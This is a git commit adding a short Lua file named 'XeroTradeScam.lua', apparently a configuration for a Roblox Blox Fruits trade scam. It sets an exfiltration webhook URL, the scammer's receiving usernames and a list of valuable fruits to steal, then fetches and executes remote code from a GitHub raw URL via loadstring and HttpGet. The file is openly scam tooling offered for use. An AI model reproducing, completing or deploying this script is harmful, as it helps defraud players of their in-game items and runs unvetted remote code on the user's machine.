e4e43ad63ef78f9706f2f9f90b0ebc9d2353acb5
XER0HUB-trade <nichitaursu226@gmail.com>
2025-04-21 13:15:11 +0300

    Create XeroTradeScam.lua

---
+++ XeroTradeScam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aS00NmZXSHUwN3VtSW9ieXJCN2U5QTpXVzhra3Q4WGt5MHU0ZUhKOHhxSDFlM24wNXI3S00zWGpUWHYyem1aVERxS1ZuNXhhVndTcjZR OTlZLVpNUkNIaXN6dnRIenFqV3ktbjZhUS1Ha1d6aExEcUZ1SexwUXB6ZmcyQjZ1QUsxMWhacm5pe EY1bk1rR2xhT2c0ZzM4RXByeW15YnZfUHBmNHpNajIzWkJYM05OdUVxbWstdksxcUhGMnFubTBheXc" -- << Your Webhook
+Usernames = {"Blockmangooriginal", "Blockmangooriginal"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Control-Control", "Gravity-Gravity", "Dragon (West)-Dragon", "Dragon (Est)-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
